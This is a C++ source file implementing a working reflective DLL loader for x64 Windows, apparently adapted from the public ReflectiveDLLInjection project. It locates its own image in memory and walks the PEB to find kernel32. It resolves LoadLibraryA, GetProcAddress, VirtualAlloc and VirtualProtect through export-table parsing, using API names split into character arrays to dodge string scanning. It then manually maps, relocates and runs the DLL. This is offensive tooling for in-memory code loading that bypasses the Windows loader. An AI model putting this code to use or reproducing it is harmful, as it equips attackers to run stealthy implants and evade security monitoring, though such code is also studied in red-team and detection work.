#include <Windows.h>
#include <intrin.h>

#include "PEB_Structs.hpp"
#include "ReflectiveLoader.hpp"

// https://github.com/stephenfewer/ReflectiveDLLInjection/blob/master/dll/src/ReflectiveLoader.c
#pragma intrinsic( _ReturnAddress )
// This function can not be inlined by the compiler or we will not get the address we expect. Ideally 
// this code will be compiled with the /O2 and /Ob1 switches. Bonus points if we could take advantage of 
// RIP relative addressing in this instance but I dont believe we can do so with the compiler intrinsics 
// available (and no inline asm available under x64).
__declspec(noinline) ULONG_PTR caller(VOID) { return (ULONG_PTR)_ReturnAddress(); }

extern "C" void Reflect() {
	BYTE* dll_content = NULL; // Start of DLL
	DWORD memcpy_count = 0;
	IMAGE_DOS_HEADER* pDosHdr;
	IMAGE_NT_HEADERS* pNTHdr;
	
	////////// Get DLL Load Address Start //////////
	
	// Get current instruction address and go back till "MZ" signature is found.
	dll_content = (BYTE*)caller();
	while (true) {
		if (*(WORD*)dll_content == IMAGE_DOS_SIGNATURE) { // "MZ" in Little Endian "0x5A4D"
			DWORD PE_Offset = ((IMAGE_DOS_HEADER*)dll_content)->e_lfanew;
			// PE signature offset won't be big, so assuimg it will be less than 1024
			if (PE_Offset < 1024) {
				// Check if PE signature is valid
				if (*(DWORD*)(dll_content + PE_Offset) == IMAGE_NT_SIGNATURE) {
					break;
				}
			}
		}
		dll_content--;
	}

	////////// Get DLL Load Address End //////////
	
	////////// Parse PEB, Resolve Addresses Start //////////
	
	HMODULE hKernel32 = NULL;
	//WCHAR lpModuleName[] = L"kernel32.dll";
	WCHAR lpModuleName[] = { L'k', L'e', L'r', L'n', L'e', L'l', L'3', L'2', L'.', L'd', L'l', L'l', 0 };

	_PEB* ProcEnvBlk = (_PEB*)__readgsqword(0x60);
	PEB_LDR_DATA* Ldr = ProcEnvBlk->pLdr;
	LIST_ENTRY* ModuleList = &(Ldr->InMemoryOrderModuleList);
	LIST_ENTRY* pStartListEntry = ModuleList->Flink;

	for (LIST_ENTRY* pListEntry = pStartListEntry; pListEntry != ModuleList; pListEntry = pListEntry->Flink) {
		LDR_DATA_TABLE_ENTRY* pEntry = (LDR_DATA_TABLE_ENTRY*)(pListEntry);
		WCHAR* sTmpFuncName = (WCHAR*)(pEntry->BaseDllName.pBuffer);

		int k = 0;
		for (k = 0; lpModuleName[k] != 0 && sTmpFuncName[k] != 0; k++) {
			WCHAR c;
			TO_LOWERCASE(c, sTmpFuncName[k]);
			if (lpModuleName[k] != c) break;
		}
		if (lpModuleName[k] == 0 && sTmpFuncName[k] == 0) {
			// Kernel32.dll is found.
			hKernel32 = (HMODULE)pEntry->DllBase;
			break;
		}
	}
	
	// Get addresses of LoadLibraryA, GetProcAddress, VirtualAlloc
	BYTE* pBaseAddr = (BYTE*)hKernel32;
	pDosHdr = (IMAGE_DOS_HEADER*)pBaseAddr;
	pNTHdr = (IMAGE_NT_HEADERS*)(pBaseAddr + pDosHdr->e_lfanew);
	IMAGE_OPTIONAL_HEADER* pOptHdr = &(pNTHdr->OptionalHeader);
	IMAGE_DATA_DIRECTORY* pExportDataDir = &(pOptHdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]);
	IMAGE_EXPORT_DIRECTORY* pExportDirAddr = (IMAGE_EXPORT_DIRECTORY*)(pBaseAddr + pExportDataDir->VirtualAddress);

	DWORD* pEAT = (DWORD*)(pBaseAddr + pExportDirAddr->AddressOfFunctions);
	DWORD* pExportFuncNamesTable = (DWORD*)(pBaseAddr + pExportDirAddr->AddressOfNames);
	WORD* pOrdinalsTable = (WORD*)(pBaseAddr + pExportDirAddr->AddressOfNameOrdinals);

	CHAR sLoadLibraryA[] = { 'l', 'o', 'a', 'd', 'l', 'i', 'b', 'r', 'a', 'r', 'y', 'a', 0 };
	CHAR sGetProcAddress[] = { 'g', 'e', 't', 'p', 'r', 'o', 'c', 'a', 'd', 'd', 'r', 'e', 's', 's', 0};
	CHAR sVirtualAlloc[] = { 'v', 'i', 'r', 't', 'u', 'a', 'l', 'a', 'l', 'l', 'o', 'c', 0 };
	CHAR sVirtualProtect[] = { 'v', 'i', 'r', 't', 'u', 'a', 'l', 'p', 'r', 'o', 't', 'e', 'c', 't', 0};

	LoadLibraryA_t pLoadLibraryA = NULL;
	GetProcAddress_t pGetProcAddress = NULL;
	VirtualAlloc_t pVirtualAlloc = NULL;
	VirtualProtect_t pVirtualProtect = NULL;
	
	for (DWORD i = 1; i < pExportDirAddr->NumberOfNames; i++) {
		CHAR* sTmpFuncName = (CHAR*)pBaseAddr + pExportFuncNamesTable[i];
		int k = 0;
		// LoadLibraryA
		for (k = 0; sLoadLibraryA[k] != 0 && sTmpFuncName[k] != 0; k++) {
			WCHAR c;
			TO_LOWERCASE(c, sTmpFuncName[k]);
			if (sLoadLibraryA[k] != c) break;
		}
		if (sLoadLibraryA[k] == 0 && sTmpFuncName[k] == 0) {
			WORD ordinal = pOrdinalsTable[i];
			pLoadLibraryA = (LoadLibraryA_t)(pBaseAddr + pEAT[ordinal]);
			continue;
		}

		// GetProcAddress
		for (k = 0; sGetProcAddress[k] != 0 && sTmpFuncName[k] != 0; k++) {
			WCHAR c;
			TO_LOWERCASE(c, sTmpFuncName[k]);
			if (sGetProcAddress[k] != c) break;
		}
		if (sGetProcAddress[k] == 0 && sTmpFuncName[k] == 0) {
			WORD ordinal = pOrdinalsTable[i];
			pGetProcAddress = (GetProcAddress_t)(pBaseAddr + pEAT[ordinal]);
			continue;
		}

		// VirtualAlloc
		for (k = 0; sVirtualAlloc[k] != 0 && sTmpFuncName[k] != 0; k++) {
			WCHAR c;
			TO_LOWERCASE(c, sTmpFuncName[k]);
			if (sVirtualAlloc[k] != c) break;
		}
		if (sVirtualAlloc[k] == 0 && sTmpFuncName[k] == 0) {
			WORD ordinal = pOrdinalsTable[i];
			pVirtualAlloc = (VirtualAlloc_t)(pBaseAddr + pEAT[ordinal]);
			continue;
		}

		// VirtualProtect
		for (k = 0; sVirtualProtect[k] != 0 && sTmpFuncName[k] != 0; k++) {
			WCHAR c;
			TO_LOWERCASE(c, sTmpFuncName[k]);
			if (sVirtualProtect[k] != c) break;
		}
		if (sVirtualProtect[k] == 0 && sTmpFuncName[k] == 0) {
			WORD ordinal = pOrdinalsTable[i];
			pVirtualProtect = (VirtualProtect_t)(pBaseAddr + pEAT[ordinal]);
			continue;
		}
	}

	////////// Parse PEB, Resolve Addresses End //////////

	////////// Mapping DLL Start //////////

	pDosHdr = (IMAGE_DOS_HEADER*)dll_content;
	pNTHdr = (IMAGE_NT_HEADERS*)(dll_content + pDosHdr->e_lfanew);

	DWORD ImageSize = pNTHdr->OptionalHeader.SizeOfImage;
	DWORD64 ImageBase = pNTHdr->OptionalHeader.ImageBase; // Compiler assumed Image Base
	//void* dll_base = pVirtualAlloc(NULL, ImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	void* dll_base = pVirtualAlloc(NULL, ImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

	DWORD64 ImageBaseDifference = (DWORD64)dll_base - ImageBase; // For Base Relocations
	// printf("Difference : %p\n", ImageBaseDifference);

	DWORD HdrSize = pNTHdr->OptionalHeader.SizeOfHeaders;
	// std::memcpy(dll_base, dll_content, HdrSize); // Mapped all Headers
	memcpy_count = HdrSize;
	for (int i = 0; i < memcpy_count; i++) {
		*((BYTE*)dll_base + i) = *((BYTE*)dll_content + i);
	} // Mapped all Headers

	DWORD OptHdrSize = pNTHdr->FileHeader.SizeOfOptionalHeader;
	IMAGE_SECTION_HEADER* pSectionTable = (IMAGE_SECTION_HEADER*)((BYTE*)&(pNTHdr->OptionalHeader) + OptHdrSize);
	DWORD SectionCount = pNTHdr->FileHeader.NumberOfSections;
	for (int i = 0; i < SectionCount; i++) {
		// printf("Name : %s\n", pSectionTable[i].Name);
		BYTE* section_source_address = (BYTE*)(dll_content + pSectionTable[i].PointerToRawData);
		BYTE* section_destination_address = (BYTE*)((BYTE*)dll_base + pSectionTable[i].VirtualAddress);
		// std::memcpy(section_destination_address, section_source_address, pSectionTable[i].SizeOfRawData);
		memcpy_count = pSectionTable[i].SizeOfRawData;
		while (memcpy_count--) {
			*section_destination_address++ = *section_source_address++;
		}
	} // Mapped all Sections

	////////// Mapping DLL End //////////

	////////// Fixing DLL Import Table Start //////////

	IMAGE_DATA_DIRECTORY* pImportDataDir = &pNTHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	IMAGE_IMPORT_DESCRIPTOR* pImportDir = (IMAGE_IMPORT_DESCRIPTOR*)((BYTE*)dll_base + pImportDataDir->VirtualAddress);
	
	while (pImportDir->Name) {
		LPCSTR library_name = (LPCSTR)((BYTE*)dll_base + pImportDir->Name);
		HMODULE hLibrary = pLoadLibraryA(library_name);
		// printf("%s\n", library_name);

		if (hLibrary) {
			IMAGE_THUNK_DATA* pThunk = (IMAGE_THUNK_DATA*)((DWORD64)dll_base + pImportDir->FirstThunk);
			while (*(DWORD64*)pThunk) {
				// Refer documentation for bitmasks in the below code
				if (*(DWORD64*)pThunk & (DWORD64)1 << 63) {
					// Import by Ordinal
					*(DWORD64*)pThunk = (DWORD64)pGetProcAddress(hLibrary, (LPCSTR)(*(DWORD64*)pThunk & 0xffff));
				}
				else {
					// Import by name
					// Adding size of WORD to ignore Ordinal and access Name data
					DWORD64* FuncAddr = (DWORD64*)((BYTE*)dll_base + *(DWORD64*)pThunk + sizeof(WORD));
					*(DWORD64*)pThunk = (DWORD64)pGetProcAddress(hLibrary, (LPCSTR)FuncAddr);
					// printf("\t%s\n", (LPCSTR)FuncAddr);
				}
				pThunk++;
			}
		}

		// pFreeLibrary(hLibrary);
		pImportDir++;
	}

	////////// Fixing DLL Import Table End //////////

	////////// Fixing DLL Base Relocations Start //////////

	IMAGE_DATA_DIRECTORY* pRelocationDataDir = &pNTHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	IMAGE_BASE_RELOCATION* pRelocationDir = (IMAGE_BASE_RELOCATION*)((DWORD64)dll_base + pRelocationDataDir->VirtualAddress);

	DWORD RelocSize = pRelocationDataDir->Size;
	DWORD RelocSizeCompleted = 0;

	while (RelocSizeCompleted < RelocSize) {
		DWORD RelocPageRVA = pRelocationDir->VirtualAddress;
		DWORD reloc_count = (pRelocationDir->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);

		RelocSizeCompleted += sizeof(IMAGE_BASE_RELOCATION);
		WORD* curr_loc = (WORD*)((DWORD64)pRelocationDir + sizeof(IMAGE_BASE_RELOCATION));
		// printf("PageRVA : %X ; Size : %X\n", RelocPageRVA, reloc_count*2 + 8);
		for (DWORD i = 0; i < reloc_count; i++) {
			RelocSizeCompleted += sizeof(WORD);
			DWORD offset = *(curr_loc + i);
			WORD offsetType = offset >> 12;

			if (offsetType == 0) { continue; }
			offset = offset & 0x0fff;

			DWORD64* RelocDst = (DWORD64*)((DWORD64)dll_base + RelocPageRVA + offset);
			DWORD64 OrigAddress = *RelocDst;
			*RelocDst += ImageBaseDifference;
			// printf("Offset : %X ; Type : %d ; Original Address : %p ; New Address : %p\n", offset, offsetType, OrigAddress, *RelocDst);
		}

		pRelocationDir = (IMAGE_BASE_RELOCATION*)((DWORD64)pRelocationDir + pRelocationDir->SizeOfBlock);
	}
	
	////////// Fixing DLL Base Relocations End //////////

	////////// Fixing Memory Permissions End //////////
	
	CHAR text[] = {'.', 't', 'e', 'x', 't', 0};
	for (int i = 0; i < SectionCount; i++) {
		int k = 0;
		for (k = 0; pSectionTable[i].Name[k] != 0 && text[k] != 0; k++) {
			if (pSectionTable[i].Name[k] != text[k]) break;
		}
		if (pSectionTable[i].Name[k] == 0 && text[k] == 0) {
			DWORD64 start = (DWORD64)dll_base + pSectionTable[i].VirtualAddress;
			DWORD size = pSectionTable[i].SizeOfRawData;
			DWORD old = 0;
			pVirtualProtect((LPVOID)start, size, PAGE_EXECUTE_READ, &old);
			break;
		}
	}
	
	////////// Fixing Memory Permissions End //////////

	////////// Calling DLL At Entry Point Start //////////

	pDLLEntry dll_entry_addr = (pDLLEntry)((BYTE*)dll_base + pNTHdr->OptionalHeader.AddressOfEntryPoint);
	dll_entry_addr((HINSTANCE)dll_base, DLL_PROCESS_ATTACH, 0);

	////////// Calling DLL At Entry Point End //////////
	
	return;
}
